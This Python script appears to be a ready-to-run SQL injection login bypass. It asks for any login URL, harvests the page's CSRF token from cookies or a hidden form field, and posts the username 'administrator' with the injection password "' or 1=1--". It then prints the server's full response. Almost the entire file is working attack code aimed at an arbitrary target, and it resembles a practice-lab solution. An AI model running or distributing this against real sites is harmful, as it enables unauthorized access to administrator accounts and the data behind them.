#!/usr/bin/env python3
import requests
import re
import sys
from urllib.parse import urljoin

def extract_csrf_from_html(html):
    # Try to find <input name="csrf" value="..."> (handles single/double quotes)
    m = re.search(r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        return m.group(1)
    # Some apps use id or other variants: try a generic hidden input search
    m = re.search(r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']csrf[^"\']*["\'][^>]*value=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        return m.group(1)
    return None

def main():
    url = input("Enter the full login URL: ").strip()
    if not (url.startswith("http://") or url.startswith("https://")):
        print("Please include scheme (http:// or https://).")
        sys.exit(1)

    s = requests.Session()

    # Headers for GET (some apps require a sane User-Agent)
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0',
    })

    try:
        # GET the login page to get session cookies and CSRF token
        get_resp = s.get(url, timeout=10)
    except requests.RequestException as e:
        print("GET request failed:", e)
        sys.exit(1)

    # Try to extract CSRF token from cookies first (common patterns)
    csrf_token = None
    # common cookie names to try
    for name in ('csrf', 'csrf_token', 'csrf-token', 'XSRF-TOKEN'):
        val = s.cookies.get(name)
        if val:
            csrf_token = val
            break

    # If not in cookies, try to parse HTML
    if not csrf_token:
        csrf_token = extract_csrf_from_html(get_resp.text)

    if not csrf_token:
        print("Failed to find CSRF token (no cookie and no hidden input).")
        print("Response body from initial GET (first 800 chars):\n")
        print(get_resp.text[:800])
        sys.exit(1)

    # Prepare headers & data for POST
    base_origin = url.rsplit('/', 1)[0]
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_origin,
        'Referer': url,
        'User-Agent': s.headers['User-Agent'],
    }

    data = {
        'csrf': csrf_token,
        'username': 'administrator',
        'password': "' or 1=1--",
    }

    try:
        post_resp = s.post(url, headers=headers, data=data, timeout=10)
    except requests.RequestException as e:
        print("POST request failed:", e)
        sys.exit(1)

    print("\n--- CSRF token used ---")
    print(csrf_token)
    print("\n--- Response Status Code ---")
    print(post_resp.status_code)
    print("\n--- Response Body ---")
    # print full response body; if very long user can redirect output to a file
    print(post_resp.text)

if __name__ == "__main__":
    main()
